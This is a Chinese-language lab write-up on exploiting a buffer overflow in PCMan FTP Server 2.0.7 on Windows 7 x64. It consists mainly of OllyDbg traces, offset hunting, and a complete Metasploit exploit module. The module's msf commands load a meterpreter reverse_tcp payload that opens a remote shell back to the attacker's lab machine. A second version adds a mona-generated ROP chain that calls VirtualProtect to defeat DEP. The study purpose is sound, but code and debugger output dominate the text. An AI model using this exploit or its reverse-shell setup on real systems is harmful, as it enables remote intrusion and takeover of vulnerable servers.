        004129CE    23CF            and ecx,edi                              ; PCManFTP.00439C18
        004129D0    58              pop eax                                  ; PCManFTP.00439C18
        004129D1    D3E0            shl eax,cl
        004129D3    C1EE 03         shr esi,0x3
        004129D6    8A4C35 E0       mov cl,byte ptr ss:[ebp+esi-0x20]
        004129DA    84C1            test cl,al
        004129DC    75 03           jnz short PCManFTP.004129E1
        004129DE    42              inc edx                                  ; ntdll_1a.7770B831
        004129DF  ^ EB E0           jmp short PCManFTP.004129C1
        004129E1    8022 00         and byte ptr ds:[edx],0x0
        004129E4    42              inc edx                                  ; ntdll_1a.7770B831
        004129E5    8B45 0C         mov eax,dword ptr ss:[ebp+0xC]
        004129E8    5F              pop edi                                  ; PCManFTP.00439C18
        004129E9    5E              pop esi                                  ; PCManFTP.00439C18
        004129EA    8950 18         mov dword ptr ds:[eax+0x18],edx          ; ntdll_1a.7770B831
        004129ED    8BC3            mov eax,ebx
        004129EF    2BC2            sub eax,edx                              ; ntdll_1a.7770B831
        004129F1    F7D8            neg eax
        004129F3    1BC0            sbb eax,eax
        004129F5    23C3            and eax,ebx
        004129F7    5B              pop ebx                                  ; PCManFTP.00439C18
        004129F8    C9              leave
        004129F9    C3              retn
    -----------------end------------------------

    直接在004129df的下一条语句004129e1上f4，发现f4以后eip直接跳到了00416685处的call getlasterror语句上，而不是f4执行到004129e1上，且f4以后0018ed5c处的004029db和0018ed64处的004029ef都被覆盖改写成41414141

    说明004129c1到004129df为关键的复制过程，这个过程覆盖了0018ed5c处的004029db和0018ed64处的004029ef

    然而在当前wsock32.recv函数帧中，如果覆盖返回地址，一般是只能覆盖到当前函数帧的上一函数帧的返回地址，即覆盖0018ed64处的004029ef，不明白为何连当前函数帧的返回地址也被覆盖成41414141了，这一点不解

    猜测是由于windows的消息机制，程序的主线程监视到有函数的返回地址被覆盖成不可执行的地址41414141时，进入异常处理链开始执行（由于主线程优先级高，于是出问题后不去41414141处执行，也不去原来wsock32.recv函数帧当中按f4处的004129e1执行）,发现没有专门对应的exception handler，最后调用unhandled exceptionfilter(后来f8单步发现是有call unhandled exceptionfilter)处理这个异常，最后弹出图error的对话框，认为有某一刻eip=41414141，但是这一刻没有在单步调试中出现，认为由004129e1处突然跳到了call getlasterror的过程中，实际上是先到eip=41414141处，然后再跳到到call getlasterror处,或许是由于这个过程太快或比较特殊而没有被od捕捉到因而没有遇到eip=41414141的时刻

    但是现在不能确定是0018ed5c处被覆盖成的41414141还是0018ed64处被覆盖的41414141是真正的那一刻eip=41414141的时刻而引起的主线程优先进入异常处理

    理论上是在004129e1处f4的时候，由于还在wsock32.recv函数帧当中，返回的先后顺序是先返回到0018ed5c处被覆盖的41414141再返回到0018ed64处被覆盖的41414141，然而0018ed5c原来被覆盖成00000000时是可以理解的，被覆盖成41414141是不可理解的，于是这两种可能性都不能确定

    在内存中覆盖时AAAA的数据由0018e58e开始到0018ed64共2006个字节，由0018e58e开始到0018ed5c共1998个字节，重新发送1998xA+BBBB+CCCC+DDDD到pcmanftp，不用od加载，看看最后的error对话框中的异常位移是多少

    向pcmanftp发送Ax1998+Bx4+Cx4+Dx4发现不能使pcmanftp停止工作,于是发送Ax1998+Bx4+Cx4+Dx4+Ex6990(共9000个字节),成功使之停止工作，但是弹出对应error图中对话框中的异常偏移为45444444，也即对应EDDD，这样应该是说明是0018ed64处的41414141被覆盖，但是又相差一个字节，不知是那里算错了，暂且不纠结于此
    
    发送Ax1998+Bx4+Cx4+Dx4+F+Ex6989（共9000个字节）,成功使之停止工作，且异常偏移显示为46444444，说明发送的9000个字节中，第2008到2011个字节处为覆盖eip处，构造exploit,发现与https://www.exploit-db.com/exploits/39662/链接中的偏移情况相同，都是在第2008-2011个字节处为覆盖返回地址的eip处,在这里填入jmp esp的地址后，再在后面填入用于反弹的shellcode即可，不同的是exploit-db中的是winxpsp3 eng环境，而此处环境为win7x64的中文系统环境
    
    在192.168.3.177中运行pcmanftp后od附加，alt+e选择一个系统dll（实验中选择的是c:\windows\system32\ntdll.dll）,在od中ctrl+f：jmp esp找到一个地址为77506aeb，构造的exploit如下：

    -------------------------exploit.rb---------------------------------
    ##
    # This module requires Metasploit: http://metasploit.com/download
    # Current source: https://github.com/rapid7/metasploit-framework
    ##
    
    require &#39;msf/core&#39;
    
    class Metasploit3 &amp;lt; Msf::Exploit::Remote
      Rank = NormalRanking
    
      include Msf::Exploit::Remote::Ftp
    
      def initialize(info = {})
        super(update_info(info,
          &#39;Name&#39;           =&amp;gt; &#39;PCMAN FTP Server Buffer Overflow - PUT Command&#39;,
          &#39;Description&#39;    =&amp;gt; %q{
              This module exploits a buffer overflow vulnerability found in the PUT command of the
              PCMAN FTP v2.0.7 Server. This requires authentication but by default anonymous
              credientials are enabled.
          },
          &#39;Author&#39;         =&amp;gt;
              [
                &#39;quanyechavshuo&#39;
              ],
          &#39;License&#39;        =&amp;gt; MSF_LICENSE,
          &#39;References&#39;     =&amp;gt;
            [
              [ &#39;EDB&#39;,   &#39;37731&#39;],
              [ &#39;OSVDB&#39;,   &#39;94624&#39;]
            ],
          &#39;DefaultOptions&#39; =&amp;gt;
            {
              &#39;EXITFUNC&#39; =&amp;gt; &#39;process&#39;
            },
          &#39;Payload&#39;        =&amp;gt;
            {
              &#39;Space&#39;   =&amp;gt; 1000,
              &#39;BadChars&#39;  =&amp;gt; &quot;\x00\x0A\x0D&quot;,
            },
          &#39;Platform&#39;       =&amp;gt; &#39;win&#39;,
          &#39;Targets&#39;        =&amp;gt;
            [
              [ &#39;windows 7 x64&#39;,
                {
                  &#39;Ret&#39; =&amp;gt; 0x776c2fe1, # jmp esp C:\WINDOWS\system32\ntdll.dll
                  &#39;Offset&#39; =&amp;gt; 2008
                }
              ],
            ],
          &#39;DisclosureDate&#39; =&amp;gt; &#39;Aug 07 2015&#39;,
          &#39;DefaultTarget&#39;  =&amp;gt; 0))
      end
    
      def check
        connect_login
        disconnect
    
        if /220 PCMan&#39;s FTP Server 2\.0/ === banner
          Exploit::CheckCode::Appears
        else
          Exploit::CheckCode::Safe
        end
      end
    
    
      def exploit
        connect_login
    
        print_status(&#39;Generating payload...&#39;)
        sploit = rand_text_alpha(target[&#39;Offset&#39;])
    
        #tmp = sploit
        #print_status(tmp)
    
        sploit &amp;lt;&amp;lt; [target.ret].pack(&#39;V&#39;)
        sploit &amp;lt;&amp;lt; make_nops(16)
        sploit &amp;lt;&amp;lt; payload.encoded
    
        tmp=sploit
        print_status(tmp)
    
        send_cmd( [&quot;ls&quot;, sploit], false )
        disconnect
      end
    
    end
    ---------------------------end--------------------------------------

exploit情况说明：
    1.在实际msf中加载上面的exploit时，发现要应该对应第2009个字节开始为填充的jmp esp的地址，也即exploit代码中的填充随机覆盖的数据要有2008个，而不是原来认为的2007个
    2.出现1中的情况认为可能是考虑覆盖偏移量时不应该从AAAA开始，要从ls命令开始，也即ls AAAA开始算
    3.上面代码中没有发送共9000个字节的数据，用反弹的shellcode代替也可成功
    4.win7系统重启后,jmp esp地址会改变，重启后代码中的jmp esp的地址不再合适
    5.将上面的代码重命名为mypcmanftp.rb,放到kali中/usr/share/metasploit-framework/moudles/exploits/windows/my/目录下，使用如下命令：
            use exploit/windows/my/mypcmanftp
            set payload windows/meterpreter/reverse_tcp
            set rhost 192.168.3.177
            set lhost 192.168.3.106
            exploit
      成功溢出后返回meterpreter的shell如下图meterpreter1，其中打印出来的数据为代码中print_status(tmp)的结果，即payload的数据
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图meterpreter1
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/meterpreter1.png&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;dep-on&quot;&gt;2&amp;gt;dep on&lt;/h4&gt;

&lt;p&gt;实验中win7x64系统中dep开启如下:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/dep_open_on_win7.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;参考
http://www.blogbus.com/riusksk-logs/80935313.html
http://drops.wooyun.org/papers/3602

目的
实现win7绕过dep并成功溢出pcmanftp

mona插件
    https://github.com/corelan/mona
    https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/
    https://huirong.github.io/2015/12/18/mona/
    http://www.cnphp6.com/archives/45078
    http://drops.wooyun.org/tips/6814

在immunity debugger中执行!mona rop -m *.dll -cp nonull,将得到如下(rop_chains.txt中)建议的rop_gadgets:

-------------rop_gadgets_from_mona____________
def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x027c9a7a,  # POP ECX # RETN [knb3rdhmpg.dll] 
      0x73c112d0,  # ptr to &amp;amp;VirtualProtect() [IAT OLEACC.dll]
      0x76969312,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [ole32.dll] 
      0x753c6833,  # XCHG EAX,ESI # RETN [KERNELBASE.dll] 
      0x76b5e6e8,  # POP EBP # RETN [msvcrt.dll] 
      0x74916f14,  # &amp;amp; push esp # ret  [RICHED20.dll]
      0x76b93866,  # POP EAX # RETN [msvcrt.dll] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x76bb2fd0,  # NEG EAX # RETN [MSCTF.dll] 
      0x7727060d,  # XCHG EAX,EBX # RETN [OLEAUT32.DLL] 
      0x027f509d,  # POP EAX # RETN [knb3rdhmpg.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x717d1e67,  # NEG EAX # RETN [winrnr.dll] 
      0x753fd586,  # XCHG EAX,EDX # RETN [comdlg32.dll] 
      0x759e9941,  # POP ECX # RETN [SHELL32.dll] 
      0x7647d27c,  # &amp;amp;Writable location [USP10.dll]
      0x759d4aad,  # POP EDI # RETN [SHELL32.dll] 
      0x76cc4404,  # RETN (ROP NOP) [USER32.dll]
      0x7364681f,  # POP EAX # RETN [COMCTL32.dll] 
      0x90909090,  # nop
      0x772b73df,  # PUSHAD # RETN [OLEAUT32.DLL] 
    ].flatten.pack(&quot;V*&quot;)

    return rop_gadgets

  end
------------------end-------------------------

在pcmanftp中，重启系统后在上面的exploit.rb中将offset由2007改成2008,有可能是重启导致的一个字节的相差

mona中给出rop_gadgets只是参考的rop，并不代表一定可用，且最新v2版本似乎有点错误，mona算出的rop_gadgets中的第一个地址0x027c9a7a在od中ctrl+g查看一下发现不是对应pop ecx,retn的地址，且有一些地址是执行会产生问题的，这时需要结合od在实际情况中调试

实际调试中发现上面的第10个地址0x7727060d对应的XCHG EAX，EBX+retn在od中ctrl+g：7727060d确实是对应xchg eax，ebx+retn指令的，但是如果第10个地址用7727060d,在od跟踪pcmanftp(在402a26处下断，并f7,再f8,f8,...)中00402a26处的call 403e60后（402a26处的call 403e60汇编语句的下一句汇编语句的地址为402a2b，在上面dep off的实验中是堆栈窗口中的18ed64处的402a2b被改成jmp esp的地址）发现堆栈窗口中从18ed64处开始的对应的第10个地址会被改写，比较奇怪，认为是这个地址出了问题，从rop_suggestions.txt中找另外的XCHG EAX，EBX+RETN对应的地址代替后不会有这个问题

pcmanftp中的关键断点：
    00402a26处的call 403e60
        403e60函数帧里面的403ee6处的call 00412cbf
            412cbf函数帧里面的412ce8处的call 00416c5c

继续od跟踪看哪些地址还需修改

运行pcmanftp后od附加，在00402a26处下断,msf发送包含下面rop_gadgets的数据到192.168.3.177

------------------changing rop_gadgets--------------
   def create_rop_chain()
        rop_gadgets = 
        [
          0x778a45e1,  # POP ECX # RETN [knb3rdhmpg.dll] 
          0x73c112d0,  # ptr to &amp;amp;VirtualProtect() [IAT OLEACC.dll]
          0x76969312,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [ole32.dll] 
          0x753c6833,  # XCHG EAX,ESI # RETN [KERNELBASE.dll] 
          0x76b5e6e8,  # POP EBP # RETN [msvcrt.dll] 
          0x74916f14,  # &amp;amp; push esp # ret  [RICHED20.dll]
          0x76b93866,  # POP EAX # RETN [msvcrt.dll] 
          0xfffffdff,  # Value to negate, will become 0x00000201
          0x76bb2fd0,  # NEG EAX # RETN [MSCTF.dll] 
          0x756bd259,  # XCHG EAX,EBX # RETN [OLEAUT32.DLL] 
          0x74923ca7,  # POP EAX # RETN [knb3rdhmpg.dll] 
          0xffffffc0,  # Value to negate, will become 0x00000040
          0x76cc4402,  # NEG EAX # RETN [winrnr.dll] 
          0x753fd586,  # XCHG EAX,EDX # RETN [comdlg32.dll] 
          0x759e9941,  # POP ECX # RETN [SHELL32.dll] 
          0x7647d27c,  # &amp;amp;Writable location [USP10.dll]
          0x759d4aad,  # POP EDI # RETN [SHELL32.dll] 
          0x76cc4404,  # RETN (ROP NOP) [USER32.dll]
          0x7364681f,  # POP EAX # RETN [COMCTL32.dll] 
          0x90909090,  # nop
          0x772b73df,  # PUSHAD # RETN [OLEAUT32.DLL] 
        ].flatten.pack(&quot;V*&quot;)
        return rop_gadgets
      end
-----------------------end--------------------------

其中向192.168.3.177中pcmanftp发送的数据在下面的sploit变量中：

-----------------------sploit---------------------
     sploit = rand_text_alpha(target[&#39;Offset&#39;])
    
        #tmp = sploit
        #print_status(tmp)
        sploit &amp;lt;&amp;lt; create_rop_chain()
        sploit &amp;lt;&amp;lt; make_nops(30)
        sploit &amp;lt;&amp;lt; &quot;\xcc&quot;
        sploit &amp;lt;&amp;lt; payload.encoded
------------------------end-----------------------

在msf发送完数据时，要在od中ctrl+v---&amp;gt;t---&amp;gt;resume all threads,原因见上面dep off情况中的分析
resume all threads后，pcmanftp中断在00402a26,f9再运行到00402a26,此时开始处理sploit变量中的send_cmd( [&quot;ls&quot;, sploit], false ),第一次中断到402a26处为处理anonymous登录相关的字符串
此时汇编窗口中的数据如下所示，eip=402a26

    00402A26    E8 35140000     call PCManFTP.00403E60
    00402A2B    8A46 03         mov al,byte ptr ds:[esi+0x3]
    00402A2E    84C0            test al,al
    00402A30    75 04           jnz short PCManFTP.00402A36
    00402A32    C646 03 20      mov byte ptr ds:[esi+0x3],0x20
    00402A36    56              push esi
    00402A37    8BCD            mov ecx,ebp
    00402A39    E8 22000000     call PCManFTP.00402A60
    00402A3E    68 DC114400     push PCManFTP.004411DC                   ; ASCII &quot;
    &quot;
    00402A43    6A 00           push 0x0
    00402A45    E8 0CFF0000     call PCManFTP.00412956
    00402A4A    8BF0            mov esi,eax
    00402A4C    83C4 08         add esp,0x8
    00402A4F    85F6            test esi,esi
    00402A51  ^ 75 A6           jnz short PCManFTP.004029F9
    00402A53    5F              pop edi                                  ; 0018ED78
    00402A54    5E              pop esi                                  ; 0018ED78
    00402A55    5D              pop ebp                                  ; 0018ED78
    00402A56    81C4 04100000   add esp,0x1004
    00402A5C    C2 0400         retn 0x4

此时堆栈中18ed64处的返回地址还没有被覆盖，如下所示：

    0018ED5C   00000000
    0018ED60   00000000
    0018ED64   00402A05  PCManFTP.00402A05
    0018ED68   0018ED78  ASCII &quot;LS XnVkIvmqpcmSqSVEClMqFIHQzEBjHrHLdzEnDtwxDnbcqTqseEHLARmjMQrGaiNEnQpxxbUisIZaqPwjoePQmmCPMzhAZDIhYffDXdhLCrWCyhuidqcfuMFhMZecDDopTpMGWcQShqwfgLoDFfnSHbUvoEMVuDLiFEYfaTFfCAAoDuwasvaujuFloUrmoYzyyWqkvXOxkMBqUsTwpPZkbQalYgrryMvEeYywOCAiJv&quot;...
    0018ED6C   00000402
    0018ED70   00000000

其中0018ed5c处的返回地址已经被覆盖成00000000，18ed68处的的指针对应的是msf中的sploit变量的数据
od中f7进入403e60函数帧：

    00403E60    A1 40354400     mov eax,dword ptr ds:[0x443540]
    00403E65    81EC 14080000   sub esp,0x814
    00403E6B    85C0            test eax,eax
    00403E6D    56              push esi
    00403E6E    57              push edi
    00403E6F    8BF1            mov esi,ecx
    00403E71    75 0D           jnz short PCManFTP.00403E80
    00403E73    A1 48354400     mov eax,dword ptr ds:[0x443548]
    00403E78    85C0            test eax,eax
    00403E7A    0F84 31010000   je PCManFTP.00403FB1
    00403E80    8D4424 08       lea eax,dword ptr ss:[esp+0x8]
    00403E84    50              push eax
    00403E85    FF15 A8524300   call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.GetLocalTi&amp;gt;; kernel32.GetLocalTime
    00403E8B    8B46 24         mov eax,dword ptr ds:[esi+0x24]
    00403E8E    85C0            test eax,eax
    00403E90    74 05           je short PCManFTP.00403E97
    00403E92    8B40 08         mov eax,dword ptr ds:[eax+0x8]
    00403E95    EB 03           jmp short PCManFTP.00403E9A
    00403E97    8B46 04         mov eax,dword ptr ds:[esi+0x4]
    00403E9A    8BBC24 20080000 mov edi,dword ptr ss:[esp+0x820]
    00403EA1    8B5424 12       mov edx,dword ptr ss:[esp+0x12]
    00403EA5    8B4E 0C         mov ecx,dword ptr ds:[esi+0xC]
    00403EA8    57              push edi
    00403EA9    50              push eax
    00403EAA    8B4424 18       mov eax,dword ptr ss:[esp+0x18]
    00403EAE    81E2 FFFF0000   and edx,0xFFFF
    00403EB4    51              push ecx
    00403EB5    8B4C24 1A       mov ecx,dword ptr ss:[esp+0x1A]
    00403EB9    25 FFFF0000     and eax,0xFFFF
    00403EBE    52              push edx
    00403EBF    8B5424 1A       mov edx,dword ptr ss:[esp+0x1A]
    00403EC3    50              push eax
    00403EC4    8B4424 1C       mov eax,dword ptr ss:[esp+0x1C]
    00403EC8    81E1 FFFF0000   and ecx,0xFFFF
    00403ECE    81E2 FFFF0000   and edx,0xFFFF
    00403ED4    51              push ecx
    00403ED5    25 FFFF0000     and eax,0xFFFF
    00403EDA    52              push edx
    00403EDB    50              push eax
    00403EDC    8D4C24 3C       lea ecx,dword ptr ss:[esp+0x3C]
    00403EE0    68 D4164400     push PCManFTP.004416D4                   ; ASCII &quot;%d/%d/%d [%02d:%02d] (%05d) %s&amp;gt; %s
    &quot;
    00403EE5    51              push ecx
    00403EE6    E8 D4ED0000     call PCManFTP.00412CBF
    00403EEB    8B0D 14354400   mov ecx,dword ptr ds:[0x443514]
    00403EF1    83C4 28         add esp,0x28
    00403EF4    83F9 FF         cmp ecx,-0x1
    00403EF7    74 14           je short PCManFTP.00403F0D
    00403EF9    8D5424 18       lea edx,dword ptr ss:[esp+0x18]
    00403EFD    6A 00           push 0x0
    00403EFF    52              push edx
    00403F00    50              push eax
    00403F01    8D4424 28       lea eax,dword ptr ss:[esp+0x28]
    00403F05    50              push eax
    00403F06    51              push ecx
    00403F07    FF15 C8524300   call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.WriteFile&amp;gt;&amp;gt;; kernel32.WriteFile
    00403F0D    A1 48354400     mov eax,dword ptr ds:[0x443548]
    00403F12    85C0            test eax,eax
    00403F14    0F84 97000000   je PCManFTP.00403FB1
    00403F1A    E8 1FCC0100     call PCManFTP.00420B3E
    00403F1F    85C0            test eax,eax
    00403F21    0F84 8A000000   je PCManFTP.00403FB1
    00403F27    8B10            mov edx,dword ptr ds:[eax]
    00403F29    8BC8            mov ecx,eax
    00403F2B    FF52 74         call dword ptr ds:[edx+0x74]
    00403F2E    85C0            test eax,eax
    00403F30    74 7F           je short PCManFTP.00403FB1
    00403F32    0FBE07          movsx eax,byte ptr ds:[edi]
    00403F35    50              push eax
    00403F36    E8 25EF0000     call PCManFTP.00412E60
    00403F3B    83C4 04         add esp,0x4
    00403F3E    85C0            test eax,eax
    00403F40    74 4A           je short PCManFTP.00403F8C
    00403F42    E8 F7CB0100     call PCManFTP.00420B3E
    00403F47    85C0            test eax,eax
    00403F49    74 23           je short PCManFTP.00403F6E
    00403F4B    8B10            mov edx,dword ptr ds:[eax]
    00403F4D    8BC8            mov ecx,eax
    00403F4F    FF52 74         call dword ptr ds:[edx+0x74]
    00403F52    8D4C24 1C       lea ecx,dword ptr ss:[esp+0x1C]
    00403F56    51              push ecx
    00403F57    68 00800000     push 0x8000
    00403F5C    8BC8            mov ecx,eax
    00403F5E    E8 8D5D0000     call PCManFTP.00409CF0
    00403F63    5F              pop edi                                  ; PCManFTP.00402A2B
    00403F64    5E              pop esi                                  ; PCManFTP.00402A2B
    00403F65    81C4 14080000   add esp,0x814
    00403F6B    C2 0400         retn 0x4

一直f8到上面403ee6处的call 00412cbf,暂时不跟进，再按f8之后将完成18ed64处的返回地址被覆盖
f8后18ed64处的覆盖内容如下：
    
    0018ED5C   564F514E  #此时此处的原来被覆盖成00000000的wsock.revc函数的返回地址被覆盖成另外的值
    0018ED60   6475586A
    0018ED64   778A45E1  返回到 ntdll_12.778A45E1 来自 ntdll_12.DbgPrint
    0018ED68   73C112D0  &amp;lt;&amp;amp;KERNEL32.VirtualProtect&amp;gt;
    0018ED6C   76969312  ole32.76969312
    0018ED70   753C6833  返回到 KernelBa.753C6833
    0018ED74   76B5E6E8  msvcrt.76B5E6E8
    0018ED78   74916F14  riched20.74916F14
    0018ED7C   76B93866  msvcrt.76B93866
    0018ED80   FFFFFDFF
    0018ED84   76BB2FD0  msctf.76BB2FD0
    0018ED88   756BD259  shell32.756BD259
    0018ED8C   74923CA7  riched20.74923CA7
    0018ED90   FFFFFFC0
    0018ED94   76CC4402  user32.76CC4402
    0018ED98   753FD586  comdlg32.753FD586
    0018ED9C   759E9941  返回到 shell32.759E9941 来自 shell32.756DC254
    0018EDA0   7647D27C  usp10.7647D27C
    0018EDA4   759D4AAD  shell32.759D4AAD
    0018EDA8   76CC4404  user32.76CC4404
    0018EDAC   7364681F  comctl32.7364681F
    0018EDB0   90909090
    0018EDB4   772B73DF  oleaut32.772B73DF
    0018EDB8   939F4848
    0018EDBC   3F9BD691
    0018EDC0   4E274E37
    0018EDC4   D6439937
    0018EDC8   4B484393
    0018EDCC   91FDF948
    0018EDD0   479FFC4E
    0018EDD4   F8CC4691

其中rop_gadgets数据已经完全和发送的一样，而rop_gadgets后0018edb8处开始到0018edd5原来应该是30个nop+”\xcc“,其中的30个nop数据不是nop数据了，”\xcc“没变

在od中ctrl+f9运行到retn，然后再f8,此时eip=rop_gadgets中第一个数据，然后再f8..f8看看哪里会出问题

f8跟踪到0018edb4处的772b73df，772b73df中的指令为pushad retn,可想，执行完pushad后esp就上移了，这样再retn的话retn到的便不是rop_gadgets中的原来的应该是30个nop处的地方（现在被改写了，不再是30个nop）

觉得是mona的错误，不应该在最后加个poshad+retn的地址，将rop_gadgets中最后的pushad+retn的地址删除后再重新发送sploit数据并跟踪到rop_gadgets中第一个数据，然后再f8..f8看看哪里会出问题

再次进入到rop_gadgets中的第一个地址778a45e1处，此时eip=778a45e1，堆栈窗口中的18ed64处的数据为：

    0018ED64   778A45E1  ntdll_12.778A45E1
    0018ED68   73C112D0  &amp;lt;&amp;amp;KERNEL32.VirtualProtect&amp;gt;
    0018ED6C   76969312  ole32.76969312
    0018ED70   753C6833  返回到 KernelBa.753C6833
    0018ED74   76B5E6E8  msvcrt.76B5E6E8
    0018ED78   74916F14  riched20.74916F14
    0018ED7C   76B93866  msvcrt.76B93866
    0018ED80   FFFFFDFF
    0018ED84   76BB2FD0  msctf.76BB2FD0
    0018ED88   756BD259  shell32.756BD259
    0018ED8C   74923CA7  riched20.74923CA7
    0018ED90   FFFFFFC0
    0018ED94   76CC4402  user32.76CC4402
    0018ED98   753FD586  comdlg32.753FD586
    0018ED9C   759E9941  返回到 shell32.759E9941 来自 shell32.756DC254
    0018EDA0   7647D27C  usp10.7647D27C
    0018EDA4   759D4AAD  shell32.759D4AAD
    0018EDA8   76CC4404  user32.76CC4404
    0018EDAC   7364681F  comctl32.7364681F
    0018EDB0   90909090
    0018EDB4   4A4E96F5
    0018EDB8   4841F59B
    0018EDBC   48FD4B99
    0018EDC0   93909899
    0018EDC4   93989B4F
    0018EDC8   904242F9
    0018EDCC   98379648
    0018EDD0   90CC2797

对比观察发现rop_gadgets中的地址还没开始执行（eip=778a45e1）时,后面的rop_gadgets数据不变，但是后面30个nop还是被改成其他数据,尝试将后面的30个nop改成41414141...再次跟踪到eip=rop_gadgets中的第一个地址778a45e1时，堆栈窗口中的数据如下：

    0018ED64   778A45E1  ntdll_12.778A45E1
    0018ED68   73C112D0  &amp;lt;&amp;amp;KERNEL32.VirtualProtect&amp;gt;
    0018ED6C   76969312  ole32.76969312
    0018ED70   753C6833  返回到 KernelBa.753C6833
    0018ED74   76B5E6E8  msvcrt.76B5E6E8
    0018ED78   74916F14  riched20.74916F14
    0018ED7C   76B93866  msvcrt.76B93866
    0018ED80   FFFFFDFF
    0018ED84   76BB2FD0  msctf.76BB2FD0
    0018ED88   756BD259  shell32.756BD259
    0018ED8C   74923CA7  riched20.74923CA7
    0018ED90   FFFFFFC0
    0018ED94   76CC4402  user32.76CC4402
    0018ED98   753FD586  comdlg32.753FD586
    0018ED9C   759E9941  返回到 shell32.759E9941 来自 shell32.756DC254
    0018EDA0   7647D27C  usp10.7647D27C
    0018EDA4   759D4AAD  shell32.759D4AAD
    0018EDA8   76CC4404  user32.76CC4404
    0018EDAC   7364681F  comctl32.7364681F
    0018EDB0   90909090
    0018EDB4   41414141
    0018EDB8   41414141
    0018EDBC   41414141
    0018EDC0   41414141
    0018EDC4   41414141
    0018EDC8   41414141
    0018EDCC   41414141
    0018EDD0   4FCC4141

发现这时后面的30个41还是正常的没有被改变的，这样说明应该是win7x64位系统下开户dep后，栈中覆盖好的nop串会被改变成其他随机的填充数据,也有可能是nop串太长为30个时才会这样，考虑到上一篇文中

http://xinghuacai.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/04/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%85%A5%E9%97%A8-%E5%8A%A8%E6%80%81%E8%B7%9F%E8%B8%AA%E6%BA%90%E4%BB%A3%E7%A0%81%E5%92%8C%E5%8F%8D%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81/

提到msf的payload前面有可能需要至少9个nop空间帮助完成payload的解码等工作，将30个nop改成9个nop试试9个nop会不会被改成随机的填充数据

再次重新跟踪到eip=rop_gadgets中的第一个地址时，18ed64处的数据为：

    0018ED64   778A45E1  ntdll_12.778A45E1
    0018ED68   73C112D0  &amp;lt;&amp;amp;KERNEL32.VirtualProtect&amp;gt;
    0018ED6C   76969312  ole32.76969312
    0018ED70   753C6833  返回到 KernelBa.753C6833
    0018ED74   76B5E6E8  msvcrt.76B5E6E8
    0018ED78   74916F14  riched20.74916F14
    0018ED7C   76B93866  msvcrt.76B93866
    0018ED80   FFFFFDFF
    0018ED84   76BB2FD0  msctf.76BB2FD0
    0018ED88   756BD259  shell32.756BD259
    0018ED8C   74923CA7  riched20.74923CA7
    0018ED90   FFFFFFC0
    0018ED94   76CC4402  user32.76CC4402
    0018ED98   753FD586  comdlg32.753FD586
    0018ED9C   759E9941  返回到 shell32.759E9941 来自 shell32.756DC254
    0018EDA0   7647D27C  usp10.7647D27C
    0018EDA4   759D4AAD  shell32.759D4AAD
    0018EDA8   76CC4404  user32.76CC4404
    0018EDAC   7364681F  comctl32.7364681F
    0018EDB0   90909090
    0018EDB4   4E43F842
    0018EDB8   D64348F9
    0018EDBC   4B46CCFD

发现9个nop还是会被填充成随机数据(后来发现不是被win7x64系统的安全保护填充的，而是因为msf自带的nop有好几种，不只是9090,其他应该是类似的花指令)，\xcc到是一直没有被改写,试着不要9个nop了,将原来rop_gadges中的pushad+retn指令的地址改成一条jmp esp指令的地址,并在该地址后接payload数据,上面的dep off时的exploit.rb中的jmp esp的地址76061b1b在dep on时为call esp汇编语句的地址,不用在od中查找其他的了，call esp也可跳到后面的pyaload执行

发送如下的rop_gadgets数据+不要nop+不要\xcc的数据到pcmanftp：

---------------sploit data-------------
def create_rop_chain()
        rop_gadgets = 
        [
          0x778a45e1,  # POP ECX # RETN [knb3rdhmpg.dll] 
          0x73c112d0,  # ptr to &amp;amp;VirtualProtect() [IAT OLEACC.dll]
          0x76969312,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [ole32.dll] 
          0x753c6833,  # XCHG EAX,ESI # RETN [KERNELBASE.dll] 
          0x76b5e6e8,  # POP EBP # RETN [msvcrt.dll] 
          0x74916f14,  # &amp;amp; push esp # ret  [RICHED20.dll]
          0x76b93866,  # POP EAX # RETN [msvcrt.dll] 
          0xfffffdff,  # Value to negate, will become 0x00000201
          0x76bb2fd0,  # NEG EAX # RETN [MSCTF.dll] 
          0x756bd259,  # XCHG EAX,EBX # RETN [OLEAUT32.DLL] 
          0x74923ca7,  # POP EAX # RETN [knb3rdhmpg.dll] 
          0xffffffc0,  # Value to negate, will become 0x00000040
          0x76cc4402,  # NEG EAX # RETN [winrnr.dll] 
          0x753fd586,  # XCHG EAX,EDX # RETN [comdlg32.dll] 
          0x759e9941,  # POP ECX # RETN [SHELL32.dll] 
          0x7647d27c,  # &amp;amp;Writable location [USP10.dll]
          0x759d4aad,  # POP EDI # RETN [SHELL32.dll] 
          0x76cc4404,  # RETN (ROP NOP) [USER32.dll]
          0x7364681f,  # POP EAX # RETN [COMCTL32.dll] 
          0x90909090,  # nop
          #0x772b73df,  # PUSHAD # RETN [OLEAUT32.DLL] 
          0x76061b1b,  #call esp
        ].flatten.pack(&quot;V*&quot;)
        return rop_gadgets
      end


      def exploit
        connect_login
    
        print_status(&#39;Generating payload...&#39;)
        sploit = rand_text_alpha(target[&#39;Offset&#39;])
    
        #tmp = sploit
        #print_status(tmp)
        sploit &amp;lt;&amp;lt; create_rop_chain()
        #sploit &amp;lt;&amp;lt; make_nops(9)
        #sploit &amp;lt;&amp;lt; &quot;\x41&quot;*30
        #sploit &amp;lt;&amp;lt; &quot;\xcc&quot;
        sploit &amp;lt;&amp;lt; payload.encoded
    
        tmp=sploit
        print_status(tmp)
    
        send_cmd( [&quot;ls&quot;, sploit], false )
        disconnect
      end
    end
